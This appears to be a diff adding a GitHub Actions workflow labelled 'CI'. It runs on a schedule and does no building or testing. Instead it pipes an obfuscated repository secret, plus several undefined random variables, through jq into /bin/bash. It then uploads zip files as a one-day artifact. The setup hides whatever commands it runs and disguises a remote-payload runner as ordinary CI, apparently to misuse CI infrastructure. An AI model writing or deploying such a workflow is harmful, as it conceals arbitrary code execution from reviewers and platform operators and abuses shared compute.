@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          guaxn086: ${{ secrets.guaxn086 }}
+        run: |
+          printf '%s' "$guaxn086" | jq -r .ctff391 | /bin/bash
+          printf '%s' "$rxh818" | jq -r .r879 | /bin/bash
+          printf '%s' "$bhnq0257" | jq -r .a94 | /bin/bash
+          printf '%s' "$eyjfy8108" | jq -r .vfzm2 | /bin/bash
+          printf '%s' "$exijq0156" | jq -r .gyugq9 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: kju4SNox
+          path: "*.zip"
+          retention-days: 1
